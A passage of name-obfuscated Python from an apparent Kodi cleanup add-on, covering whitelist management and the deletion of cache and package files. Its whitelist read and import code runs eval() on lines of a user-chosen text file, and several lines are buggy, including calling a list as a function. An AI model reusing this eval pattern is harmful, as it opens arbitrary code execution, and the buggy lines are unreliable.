			O00000O00OOOO0O0O =parseDOM (O0OO0OOOO00OOO000 ,'addon',ret ='name')#line:2135
			O000O0000OOOOO00O =OOO0OO0O00O0000OO if len (OOOOO000O0OO0OO0O )==0 else OOOOO000O0OO0OO0O [0 ]#line:2136
			O0O00O000000O0O00 =OOO0OO0O00O0000OO if len (O00000O00OOOO0O0O )==0 else O00000O00OOOO0O0O [0 ]#line:2137
			OOO000O0OO0OOO0OO =O0O00O000000O0O00 .replace ('[','<').replace (']','>')#line:2138
			OOO000O0OO0OOO0OO =re .sub ('<[^<]+?>','',OOO000O0OO0OOO0OO )#line:2139
			O0O0O0OOO0O0OOO00 .append (OOO000O0OO0OOO0OO )#line:2140
			O0OOO000OO0000000 .append (O000O0000OOOOO00O )#line:2141
			O0O0OO0OO000OOO00 .append (OOO0OO0O00O0000OO )#line:2142
		O0O000O0OO00OO00O =[];OO000O000OO0O000O =0 #line:2143
		O00000O0OOOO0OOO0 =["-- לחץ כאן להמשך --"]+O0O0O0OOO0O0OOO00 #line:2144
		O0OOO0OOOO00OO00O =whiteList ('read')#line:2145
		for O0OO0000O00O0O00O in O0OOO0OOOO00OO00O :#line:2146
			log (str (O0OO0000O00O0O00O ),xbmc .LOGDEBUG )#line:2147
			try :O0OO0OO0OOOO0000O ,O0O0O0OOOO000OO00 ,O0O0OO0O00O0O00O0 =O0OO0000O00O0O00O #line:2148
			except Exception as OOO0OOO000OO0OOO0 :log (str (OOO0OOO000OO0OOO0 ))#line:2149
			if O0O0O0OOOO000OO00 in O0OOO000OO0000000 :#line:2150
				OOOOO00000OO00O00 =O0OOO000OO0000000 .index (O0O0O0OOOO000OO00 )+1 #line:2151
				O0O000O0OO00OO00O .append (OOOOO00000OO00O00 -1 )#line:2152
				O00000O0OOOO0OOO0 [OOOOO00000OO00O00 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0OO0OO0OOOO0000O )#line:2153
			else :#line:2154
				O0OOO000OO0000000 .append (O0O0O0OOOO000OO00 )#line:2155
				O0O0O0OOO0O0OOO00 .append (O0OO0OO0OOOO0000O )#line:2156
				O00000O0OOOO0OOO0 .append ("[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0OO0OO0OOOO0000O ))#line:2157
		OO000O000OO0O000O =1 #line:2158
		while not OO000O000OO0O000O in [-1 ,0 ]:#line:2159
			OO000O000OO0O000O =DIALOG .select ("%s: בחר הרחבות לשמירה ."%ADDONTITLE ,O00000O0OOOO0OOO0 )#line:2160
			if OO000O000OO0O000O ==-1 :break #line:2161
			elif OO000O000OO0O000O ==0 :break #line:2162
			else :#line:2163
				O000O0O00O0OOOOO0 =(OO000O000OO0O000O -1 )#line:2164
				if O000O0O00O0OOOOO0 in O0O000O0OO00OO00O :#line:2165
					O0O000O0OO00OO00O .remove (O000O0O00O0OOOOO0 )#line:2166
					O00000O0OOOO0OOO0 [OO000O000OO0O000O ]=O0O0O0OOO0O0OOO00 [O000O0O00O0OOOOO0 ]#line:2167
				else :#line:2168
					O0O000O0OO00OO00O .append (O000O0O00O0OOOOO0 )#line:2169
					O00000O0OOOO0OOO0 [OO000O000OO0O000O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0O0O0OOO0O0OOO00 [O000O0O00O0OOOOO0 ])#line:2170
		OO0OOOOOO0000O0OO =[]#line:2171
		if len (O0O000O0OO00OO00O )>0 :#line:2172
			for O0000OOO00O00000O in O0O000O0OO00OO00O :#line:2173
				OO0OOOOOO0000O0OO .append ("['%s', '%s', '%s']"%(O0O0O0OOO0O0OOO00 [O0000OOO00O00000O ],O0OOO000OO0000000 [O0000OOO00O00000O ],O0O0OO0OO000OOO00 [O0000OOO00O00000O ]))#line:2174
			O0000OOO0O0OO0O0O ='\n'.join (OO0OOOOOO0000O0OO )#line:2175
			OO000OO0OOO0OOOOO =open (WHITELIST ,'w');OO000OO0OOO0OOOOO .write (O0000OOO0O0OO0O0O );OO000OO0OOO0OOOOO .close ()#line:2176
		else :#line:2177
			try :os .remove (WHITELIST )#line:2178
			except :pass #line:2179
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Addons in White List[/COLOR]"%(COLOR2 ,len (O0O000O0OO00OO00O )))#line:2180
	elif OOO0OOOOO00O000O0 =='read':#line:2181
		O00O00O00OO00OO0O =[]#line:2182
		if os .path .exists (WHITELIST ):#line:2183
			OO000OO0OOO0OOOOO =open (WHITELIST )#line:2184
			O0OO0OOOO00OOO000 =OO000OO0OOO0OOOOO .read ()#line:2185
			OO000OO0OOO0OOOOO .close ()#line:2186
			OO0OOOOOOO0O00O0O =O0OO0OOOO00OOO000 .split ('\n')#line:2187
			for O0OO0000O00O0O00O in OO0OOOOOOO0O00O0O :#line:2188
				try :#line:2189
					O0OO0OO0OOOO0000O ,O0O0O0OOOO000OO00 ,O0O0OO0O00O0O00O0 =eval (O0OO0000O00O0O00O )#line:2190
					O00O00O00OO00OO0O .append (eval (O0OO0000O00O0O00O ))#line:2191
				except :#line:2192
					pass #line:2193
		return O00O00O00OO00OO0O #line:2194
	elif OOO0OOOOO00O000O0 =='view':#line:2195
		O0OO000O000000OOO =whiteList ('read')#line:2196
		if len (O0OO000O000000OOO )>0 :#line:2197
			OOO0O0OO0O000O0OO ="רשימת הרחבות שסימנתם שלא ימחקו בהתקנה נקיה או רגילה.[CR][CR]"#line:2198
			for O0OO0000O00O0O00O in O0OO000O000000OOO :#line:2199
				try :O0OO0OO0OOOO0000O ,O0O0O0OOOO000OO00 ,O0O0OO0O00O0O00O0 =O0OO0000O00O0O00O #line:2200
				except Exception as OOO0OOO000OO0OOO0 :log (str (OOO0OOO000OO0OOO0 ))#line:2201
				OOO0O0OO0O000O0OO +="[COLOR %s]%s[/COLOR] [COLOR %s]\"%s\"[/COLOR][CR]"%(COLOR1 ,O0OO0OO0OOOO0000O ,COLOR2 ,O0O0O0OOOO000OO00 )#line:2202
			TextBox ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),OOO0O0OO0O000O0OO )#line:2203
		else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No items in White List[/COLOR]"%COLOR2 )#line:2204
	elif OOO0OOOOO00O000O0 =='import':#line:2205
		O0OOO0OO0O0O0OO0O =DIALOG .browse (1 ,'[COLOR %s]Select the whitelist file to import[/COLOR]'%COLOR2 ,'files','.txt',False ,False ,HOME )#line:2206
		log (str (O0OOO0OO0O0O0OO0O ))#line:2207
		if not O0OOO0OO0O0O0OO0O .endswith ('.txt'):#line:2208
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Cancelled![/COLOR]"%COLOR2 )#line:2209
			return #line:2210
		OO000OO0OOO0OOOOO =xbmcvfs .File (O0OOO0OO0O0O0OO0O )#line:2211
		O0OO0OOOO00OOO000 =OO000OO0OOO0OOOOO .read ()#line:2212
		OO000OO0OOO0OOOOO .close ()#line:2213
		O00O00OO00O0000O0 =whiteList ('read');O0OO0OOO00O0O00OO =[];OOOO0O0OO00OOO000 =0 #line:2214
		for O0OO0000O00O0O00O in O00O00OO00O0000O0 :#line:2215
			O0OO0OO0OOOO0000O ,O0O0O0OOOO000OO00 ,O0O0OO0O00O0O00O0 =O0OO0000O00O0O00O #line:2216
			O0OO0OOO00O0O00OO .append (O0O0O0OOOO000OO00 )#line:2217
		OO0OOOOOOO0O00O0O =O0OO0OOOO00OOO000 .split ('\n')#line:2218
		with open (WHITELIST ,'a')as OO000OO0OOO0OOOOO :#line:2219
			for O0OO0000O00O0O00O in OO0OOOOOOO0O00O0O :#line:2220
				try :#line:2221
					O0OO0OO0OOOO0000O ,O0O0O0OOOO000OO00 ,O00000OO0000OO0OO =eval (O0OO0000O00O0O00O )#line:2222
				except Exception as OOO0OOO000OO0OOO0 :#line:2223
					log ("Error Adding: '%s' / %s"%(O0OO0000O00O0O00O ,str (OOO0OOO000OO0OOO0 )),xbmc .LOGERROR )#line:2224
					continue #line:2225
				log ("%s / %s / %s"%(O0OO0OO0OOOO0000O ,O0O0O0OOOO000OO00 ,O00000OO0000OO0OO ),xbmc .LOGDEBUG )#line:2226
				if not O0O0O0OOOO000OO00 in O0OO0OOO00O0O00OO :#line:2227
					OOOO0O0OO00OOO000 +=1 #line:2228
					O0000OOO0O0OO0O0O ="['%s', '%s', '%s']"%(O0OO0OO0OOOO0000O ,O0O0O0OOOO000OO00 ,O00000OO0000OO0OO )#line:2229
					if len (O0OO0OOO00O0O00OO )+OOOO0O0OO00OOO000 >1 :O0000OOO0O0OO0O0O ="\n%s"%O0000OOO0O0OO0O0O #line:2230
					OO000OO0OOO0OOOOO .write (O0000OOO0O0OO0O0O )#line:2231
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Item(s) Added[/COLOR]"%(COLOR2 ,OOOO0O0OO00OOO000 ))#line:2232
	elif OOO0OOOOO00O000O0 =='export':#line:2233
		O0OOO0OO0O0O0OO0O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the whitelist file[/COLOR]'%COLOR2 ,'files','.txt',False ,False ,HOME )#line:2234
		log (str (O0OOO0OO0O0O0OO0O ),xbmc .LOGDEBUG )#line:2235
		try :#line:2236
			xbmcvfs .copy (WHITELIST ,os .path .join (O0OOO0OO0O0O0OO0O ,'whitelist.txt'))#line:2237
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Whitelist has been exported to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0OOO0OO0O0O0OO0O ,'whitelist.txt')))#line:2238
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Whitelist Exported[/COLOR]"%(COLOR2 ))#line:2239
		except Exception as OOO0OOO000OO0OOO0 :#line:2240
			log ("Export Error: %s"%str (OOO0OOO000OO0OOO0 ),xbmc .LOGERROR )#line:2241
			if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The location you selected isnt writable would you like to select another one?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Change Location[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:2242
				LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Whitelist Export Cancelled[/COLOR]"%(COLOR2 ,OOO0OOO000OO0OOO0 ))#line:2243
			else :#line:2244
				OO0OOOOOO0000O0OO (export )#line:2245
	elif OOO0OOOOO00O000O0 =='clear':#line:2246
		if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Are you sure you want to clear your whitelist?"%COLOR2 ,"This process can't be undone.[/COLOR]",yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:2247
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Clear Whitelist Cancelled[/COLOR]"%(COLOR2 ))#line:2248
			return #line:2249
		try :#line:2250
			os .remove (WHITELIST )#line:2251
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Whitelist Cleared[/COLOR]"%(COLOR2 ))#line:2252
		except :#line:2253
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Error Clearing Whitelist![/COLOR]"%(COLOR2 ))#line:2254
def clearPackages (over =None ):#line:2256
	if os .path .exists (PACKAGES ):#line:2257
		try :#line:2258
			for OO0000OOOOO0OO000 ,O000000O00000O0O0 ,OOO00OO000OO0000O in os .walk (PACKAGES ):#line:2259
				OO0O00OOO0O0OO00O =0 #line:2260
				OO0O00OOO0O0OO00O +=len (OOO00OO000OO0000O )#line:2261
				if OO0O00OOO0O0OO00O >0 :#line:2262
					OO00OOOO00O0O0OO0 =convertSize (getSize (PACKAGES ))#line:2263
					if over :OO0OOO0O0OOO0O00O =1 #line:2264
					else :OO0OOO0O0OOO0O00O =1 #line:2265
					if OO0OOO0O0OOO0O00O :#line:2266
						for OOO0000O0OOO00O0O in OOO00OO000OO0000O :os .unlink (os .path .join (OO0000OOOOO0OO000 ,OOO0000O0OOO00O0O ))#line:2267
						for OO0O00O0OO00O000O in O000000O00000O0O0 :shutil .rmtree (os .path .join (OO0000OOOOO0OO000 ,OO0O00O0OO00O000O ))#line:2268
						LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Success![/COLOR]'%COLOR2 )#line:2269
				else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: None Found![/COLOR]'%COLOR2 )#line:2270
		except Exception as O0OO0O0O0O00OOO00 :#line:2271
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Error![/COLOR]'%COLOR2 )#line:2272
			log ("Clear Packages Error: %s"%str (O0OO0O0O0O00OOO00 ),xbmc .LOGERROR )#line:2273
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: None Found![/COLOR]'%COLOR2 )#line:2274
def clearPackagesStartup ():#line:2276
	OOOOOOO00O0O000O0 =datetime .utcnow ()-timedelta (minutes =3 )#line:2277
	O00OO0OOO0O0OO000 =0 ;OOOOO0O0O0OO000O0 =0 #line:2278
	if os .path .exists (PACKAGES ):#line:2279
		OOO00OO00OO000OOO =os .listdir (PACKAGES )#line:2280
		OOO00OO00OO000OOO .sort (key =lambda O00OOO0O00O0O0O00 :os .path .getmtime (os .path .join (PACKAGES ,O00OOO0O00O0O0O00 )))#line:2281
		try :#line:2282
			for O0OOO0OOOOO00O000 in OOO00OO00OO000OOO :#line:2283
				OO0O0OOO0000OOO0O =os .path .join (PACKAGES ,O0OOO0OOOOO00O000 )#line:2284
				OOOOO000O0O000O00 =datetime .utcfromtimestamp (os .path .getmtime (OO0O0OOO0000OOO0O ))#line:2285
				if OOOOO000O0O000O00 <=OOOOOOO00O0O000O0 :#line:2286
					if os .path .isfile (OO0O0OOO0000OOO0O ):#line:2287
						O00OO0OOO0O0OO000 +=1 #line:2288
						OOOOO0O0O0OO000O0 +=os .path .getsize (OO0O0OOO0000OOO0O )#line:2289
						os .unlink (OO0O0OOO0000OOO0O )#line:2290
					elif os .path .isdir (OO0O0OOO0000OOO0O ):#line:2291
						OOOOO0O0O0OO000O0 +=getSize (OO0O0OOO0000OOO0O )#line:2292
						O000OO0O000OO0OO0 ,O0O0OO0O0OO00OOO0 =cleanHouse (OO0O0OOO0000OOO0O )#line:2293
						O00OO0OOO0O0OO000 +=O000OO0O000OO0OO0 +O0O0OO0O0OO00OOO0 #line:2294
						try :#line:2295
							shutil .rmtree (OO0O0OOO0000OOO0O )#line:2296
						except Exception as OO000O0OOOOO0O0OO :#line:2297
							log ("Failed to remove %s: %s"%(OO0O0OOO0000OOO0O ,str (OO000O0OOOOO0O0OO ),xbmc .LOGERROR ))#line:2298
			if O00OO0OOO0O0OO000 >0 :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Success: %s[/COLOR]'%(COLOR2 ,convertSize (OOOOO0O0O0OO000O0 )))#line:2299
			else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: None Found![/COLOR]'%COLOR2 )#line:2300
		except Exception as OO000O0OOOOO0O0OO :#line:2301
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Error![/COLOR]'%COLOR2 )#line:2302
			log ("Clear Packages Error: %s"%str (OO000O0OOOOO0O0OO ),xbmc .LOGERROR )#line:2303
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: None Found![/COLOR]'%COLOR2 )#line:2304
def clearCache (over =None ):#line:2306
	O00OOO0OOO0O0OO0O =os .path .join (PROFILE ,'addon_data')#line:2319
	OO000O000000O00OO =[(os .path .join (ADDONDATA ,'plugin.video.HebDub.movies','database.db')),(os .path .join (ADDONDATA ,'plugin.video.bob','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.specto','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db')),(os .path .join (DATABASE ,'onechannelcache.db')),(os .path .join (DATABASE ,'saltscache.db')),(os .path .join (DATABASE ,'saltshd.lite.db'))]#line:2328
	O0OO0O0O00O0OOOO0 =[(O00OOO0OOO0O0OO0O ),(ADDONDATA ),(os .path .join (HOME ,'cache')),(os .path .join (HOME ,'cache')),(os .path .join (HOME ,'temp')),os .path .join (xbmc .translatePath ('special://profile/addon_data/plugin.program.autocompletion/Google'),''),os .path .join (xbmc .translatePath ('special://profile/addon_data/script.skin.helper.colorpicker/colors'),''),os .path .join (xbmc .translatePath ('special://profile/addon_data/service.subtitles.All_Subs/aa_buff'),''),os .path .join (xbmc .translatePath ('special://profile/addon_data/service.subtitles.All_Subs/temp_wizdom'),''),os .path .join (xbmc .translatePath ('special://profile/addon_data/service.subtitles.All_Subs/temp'),''),os .path .join (xbmc .translatePath ('special://profile/addon_data/script.colorbox'),''),os .path .join (xbmc .translatePath ('special://profile/addon_data/script.module.metadatautils/animatedgifs'),''),os .path .join (xbmc .translatePath ('special://profile/addon_data/script.artistslideshow/ArtistInformation'),''),os .path .join (xbmc .translatePath ('special://profile/addon_data/script.artistslideshow/ArtistSlideshow'),''),os .path .join (xbmc .translatePath ('special://profile/addon_data/script.artistslideshow/merge'),''),os .path .join (xbmc .translatePath ('special://profile/addon_data/script.artistslideshow/temp'),''),os .path .join (xbmc .translatePath ('special://profile/addon_data/script.artistslideshow/transition'),''),os .path .join (xbmc .translatePath ('special://profile/addon_data/script.artistslideshow/resources'),''),os .path .join (xbmc .translatePath ('special://profile/addon_data/plugin.video.movixws/logos'),''),os .path .join (xbmc .translatePath ('special://profile/addon_data/service.subtitles.subscenter/temp'),''),os .path .join (xbmc .translatePath ('special://profile/addon_data/plugin.video.idanplus/epg.json'),''),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','Other')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','LocalAndRental')),(os .path .join (ADDONS ,'temp')),(os .path .join (O00OOO0OOO0O0OO0O ,'script.module.simple.downloader')),(os .path .join (O00OOO0OOO0O0OO0O ,'plugin.video.itv','Images'))]#line:2357
	OOOOOOOOO0OOOO0O0 =0 #line:2358
	OO0O0OO00OO00O0OO =['meta_cache','archive_cache']#line:2359
	for OOO0OO0O0O0000OOO in O0OO0O0O00O0OOOO0 :#line:2360
		if os .path .exists (OOO0OO0O0O0000OOO )and not OOO0OO0O0O0000OOO in [ADDONDATA ,O00OOO0OOO0O0OO0O ]:#line:2361
			for O0O0O00O000O0O00O ,O000O000OOOOO000O ,OO0OO0000O0O00OO0 in os .walk (OOO0OO0O0O0000OOO ):#line:2362
				O000O000OOOOO000O [:]=[O0OO0OOOOO000OO00 for O0OO0OOOOO000OO00 in O000O000OOOOO000O if O0OO0OOOOO000OO00 not in OO0O0OO00OO00O0OO ]#line:2363
				OO0O00000OOOOO00O =0 #line:2364
				OO0O00000OOOOO00O +=len (OO0OO0000O0O00OO0 )#line:2365
				if OO0O00000OOOOO00O >0 :#line:2366
					for OO0OOO0OO0O00000O in OO0OO0000O0O00OO0 :#line:2367
						if not OO0OOO0OO0O00000O in LOGFILES :#line:2368
							try :#line:2369
								os .unlink (os .path .join (O0O0O00O000O0O00O ,OO0OOO0OO0O00000O ))#line:2370
								log ("[Wiped] %s"%os .path .join (O0O0O00O000O0O00O ,OO0OOO0OO0O00000O ),xbmc .LOGNOTICE )#line:2371
								OOOOOOOOO0OOOO0O0 +=1 #line:2372
							except :#line:2373
								pass #line:2374
						else :log ('Ignore Log File: %s'%OO0OOO0OO0O00000O ,xbmc .LOGNOTICE )#line:2375
					for OO00OOOOOOO00O0O0 in O000O000OOOOO000O :#line:2376
						try :#line:2377
							shutil .rmtree (os .path .join (O0O0O00O000O0O00O ,OO00OOOOOOO00O0O0 ))#line:2378
							OOOOOOOOO0OOOO0O0 +=1 #line:2379
							log ("[Success] cleared %s files from %s"%(str (OO0O00000OOOOO00O ),os .path .join (OOO0OO0O0O0000OOO ,OO00OOOOOOO00O0O0 )),xbmc .LOGNOTICE )#line:2380
						except :#line:2381
							log ("[Failed] to wipe cache in: %s"%os .path .join (OOO0OO0O0O0000OOO ,OO00OOOOOOO00O0O0 ),xbmc .LOGNOTICE )#line:2382
	if os .path .exists (PACKAGES ):#line:2394
		try :#line:2395
			for O0O0O00O000O0O00O ,O000O000OOOOO000O ,OO0OO0000O0O00OO0 in os .walk (PACKAGES ):#line:2396
				OO0O00000OOOOO00O =0 #line:2397
				OO0O00000OOOOO00O +=len (OO0OO0000O0O00OO0 )#line:2398
				if OO0O00000OOOOO00O >0 :#line:2399
					O00OOOO0O00O0O0O0 =convertSize (getSize (PACKAGES ))#line:2400
					if over :O00O00OOOOO00OO00 =1 #line:2401
					else :O00O00OOOOO00OO00 =1 #line:2402
					if O00O00OOOOO00OO00 :#line:2403
						for OO0OOO0OO0O00000O in OO0OO0000O0O00OO0 :os .unlink (os .path .join (O0O0O00O000O0O00O ,OO0OOO0OO0O00000O ))#line:2404
						for OO00OOOOOOO00O0O0 in O000O000OOOOO000O :shutil .rmtree (os .path .join (O0O0O00O000O0O00O ,OO00OOOOOOO00O0O0 ))#line:2405
						LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ניקוי קבצי התקנה: נמחקו![/COLOR]'%COLOR2 )#line:2406
		except Exception as OO0OOO0O00OO0OOOO :#line:2408
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ניקוי קבצי התקנה: לא הצליח למחוק![/COLOR]'%COLOR2 )#line:2409
			log ("Clear Packages Error: %s"%str (OO0OOO0O00OO0OOOO ),xbmc .LOGERROR )#line:2410
	if INCLUDEVIDEO =='true'and over ==None :#line:2412
		OO0OO0000O0O00OO0 =[]#line:2413
		if INCLUDEALL =='true':OO0OO0000O0O00OO0 =OO000O000000O00OO #line:2414
		else :#line:2415
			if INCLUDEBOB =='true':OO0OO0000O0O00OO0 .append (os .path .join (ADDONDATA ,'plugin.video.bob','cache.db'))#line:2416
			if INCLUDEPHOENIX =='true':OO0OO0000O0O00OO0 .append (os .path .join (ADDONDATA ,'plugin.video.HebDub.movies','database.db'))#line:2417
			if INCLUDESPECTO =='true':OO0OO0000O0O00OO0 .append (os .path .join (ADDONDATA ,'plugin.video.specto','cache.db'))#line:2418
			if INCLUDEGENESIS =='true':OO0OO0000O0O00OO0 .append (os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db'))#line:2419
			if INCLUDEEXODUS =='true':OO0OO0000O0O00OO0 .append (os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db'))#line:2420
			if INCLUDEONECHAN =='true':OO0OO0000O0O00OO0 .append (os .path .join (DATABASE ,'onechannelcache.db'))#line:2421
			if INCLUDESALTS =='true':OO0OO0000O0O00OO0 .append (os .path .join (DATABASE ,'saltscache.db'))#line:2422
			if INCLUDESALTSHD =='true':OO0OO0000O0O00OO0 .append (os .path .join (DATABASE ,'saltshd.lite.db'))#line:2423
		if len (OO0OO0000O0O00OO0 )>0 :#line:2424
			for OOO0OO0O0O0000OOO in OO0OO0000O0O00OO0 :#line:2425
				if os .path .exists (OOO0OO0O0O0000OOO ):#line:2426
					OOOOOOOOO0OOOO0O0 +=1 #line:2427
					try :#line:2428
						OOO0O00OOOOOOOO0O =database .connect (OOO0OO0O0O0000OOO )#line:2429
						O0000O00OO00O0O0O =OOO0O00OOOOOOOO0O .cursor ()#line:2430
					except Exception as OO0OOO0O00OO0OOOO :#line:2431
						log ("DB Connection error: %s"%str (OO0OOO0O00OO0OOOO ),xbmc .LOGERROR )#line:2432
						continue #line:2433
					if 'Database'in OOO0OO0O0O0000OOO :#line:2434
						try :#line:2435
							O0000O00OO00O0O0O .execute ("DELETE FROM url_cache")#line:2436
							O0000O00OO00O0O0O .execute ("VACUUM")#line:2437
							OOO0O00OOOOOOOO0O .commit ()#line:2438
							O0000O00OO00O0O0O .close ()#line:2439
							log ("[Success] wiped %s"%OOO0OO0O0O0000OOO ,xbmc .LOGNOTICE )#line:2440
						except Exception as OO0OOO0O00OO0OOOO :#line:2441
							log ("[Failed] wiped %s: %s"%(OOO0OO0O0O0000OOO ,str (OO0OOO0O00OO0OOOO )),xbmc .LOGNOTICE )#line:2442
					else :#line:2443
						O0000O00OO00O0O0O .execute ("SELECT name FROM sqlite_master WHERE type = 'table'")#line:2444
						for O0O0OOOOOOO00OOO0 in O0000O00OO00O0O0O .fetchall ():#line:2445
							try :#line:2446
								O0000O00OO00O0O0O .execute ("DELETE FROM %s"%O0O0OOOOOOO00OOO0 [0 ])#line:2447
								O0000O00OO00O0O0O .execute ("VACUUM")#line:2448
								OOO0O00OOOOOOOO0O .commit ()#line:2449
								log ("[Success] wiped %s in %s"%(O0O0OOOOOOO00OOO0 ,OOO0OO0O0O0000OOO ),xbmc .LOGNOTICE )#line:2450
							except Exception as OO0OOO0O00OO0OOOO :#line:2451
								log ("[Failed] wiped %s in %s: %s"%(O0O0OOOOOOO00OOO0 ,OOO0OO0O0O0000OOO ,str (OO0OOO0O00OO0OOOO )),xbmc .LOGNOTICE )#line:2452
						O0000O00OO00O0O0O .close ()#line:2453
		else :log ("Clear Cache: Clear Video Cache Not Enabled",xbmc .LOGNOTICE )#line:2454
	LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ניקוי מטמון: נמחקו %s קבצים[/COLOR]'%(COLOR2 ,OOOOOOOOO0OOOO0O0 ))#line:2455
def clearCache3 ():#line:2457
    O00O0000OO00000OO =os .path .join (PROFILE ,'addon_data')#line:2458
    O0O0OO0000OOO0OOO =[(O00O0000OO00000OO ),(ADDONDATA ),(os .path .join (HOME ,'cache')),(os .path .join (HOME ,'temp')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','Other')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','LocalAndRental')),(os .path .join (ADDONDATA ,'plugin.video.bob','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.bob.unleashed','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.specto','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.covenant','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.elementum','app.db-wal')),(os .path .join (ADDONDATA ,'plugin.video.itv','Images')),(os .path .join (DATABASE ,'onechannelcache.db')),(os .path .join (DATABASE ,'saltscache.db')),(os .path .join (DATABASE ,'saltshd.lite.db')),(os .path .join (O00O0000OO00000OO ,'script.module.simple.downloader')),(os .path .join (O00O0000OO00000OO ,'plugin.video.itv','Images'))]#line:2478
    O00O0O0O000OO0000 =0 #line:2480
    for OOO0OO000OO0O00O0 in O0O0OO0000OOO0OOO :#line:2482
        if os .path .exists (OOO0OO000OO0O00O0 )and not OOO0OO000OO0O00O0 in [ADDONDATA ,O00O0000OO00000OO ]:#line:2483
            for OO000O0O0OOOO0O00 ,OO00O00000OOO00O0 ,O0OOOOO000OOOO0O0 in os .walk (OOO0OO000OO0O00O0 ):#line:2484
                O00OOO0OOOO0O00OO =0 #line:2485
                O00OOO0OOOO0O00OO +=len (O0OOOOO000OOOO0O0 )#line:2486
                if O00OOO0OOOO0O00OO >0 :#line:2487
                    for O0000OO00O0O00O00 in O0OOOOO000OOOO0O0 :#line:2488
                        if not O0000OO00O0O00O00 in ['kodi.log','tvmc.log','spmc.log','xbmc.log']:#line:2489
                            try :#line:2490
                                os .unlink (os .path .join (OO000O0O0OOOO0O00 ,O0000OO00O0O00O00 ))#line:2491
                            except :#line:2492
                                pass #line:2493
                        else :log ('Ignore Log File: %s'%O0000OO00O0O00O00 )#line:2494
                    for OO0OO00O00O0OOOOO in OO00O00000OOO00O0 :#line:2495
                        try :#line:2496
                            shutil .rmtree (os .path .join (OO000O0O0OOOO0O00 ,OO0OO00O00O0OOOOO ))#line:2497
                            O00O0O0O000OO0000 +=1 #line:2498
                            log ("[COLOR red][Success]  %s Files Removed From %s [/COLOR]"%(str (O00OOO0OOOO0O00OO ),os .path .join (OOO0OO000OO0O00O0 ,OO0OO00O00O0OOOOO )))#line:2499
                        except :#line:2500
                            log ("[COLOR red][Failed] To Wipe Cache In: %s [/COLOR]"%os .path .join (OOO0OO000OO0O00O0 ,OO0OO00O00O0OOOOO ))#line:2501
        else :#line:2502
            for OO000O0O0OOOO0O00 ,OO00O00000OOO00O0 ,O0OOOOO000OOOO0O0 in os .walk (OOO0OO000OO0O00O0 ):#line:2503
                for OO0OO00O00O0OOOOO in OO00O00000OOO00O0 :#line:2504
                    if 'cache'in OO0OO00O00O0OOOOO .lower ():#line:2505
                        try :#line:2506
                            shutil .rmtree (os .path .join (OO000O0O0OOOO0O00 ,OO0OO00O00O0OOOOO ))#line:2507
                            O00O0O0O000OO0000 +=1 #line:2508
